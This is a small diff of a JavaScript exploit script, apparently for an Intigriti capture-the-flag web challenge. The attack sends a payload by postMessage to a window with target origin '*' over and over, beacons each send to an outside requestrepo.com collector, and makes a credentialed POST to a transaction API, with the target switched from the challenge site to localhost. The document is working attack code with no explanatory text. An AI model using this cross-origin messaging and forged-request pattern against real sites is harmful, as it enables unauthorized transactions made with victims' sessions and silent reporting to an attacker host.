@@ -13,17 +13,17 @@
         }
     };
 
-    setTimeout(() => {
+    setInterval(() => {
         if (win) {
             console.log("Sending payload...");
             win.postMessage(payload, "*");
             fetch(`https://we6hfxdk.requestrepo.com?status=sent`);
         }
-    }, 2000);
+    }, 100);
         
     async function executeAttack() {
         try {
-            const response = await fetch('https://challenge-0126.intigriti.io/api/transaction', {
+            const response = await fetch('https://localhost:8000/api/transaction', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 credentials: 'include',
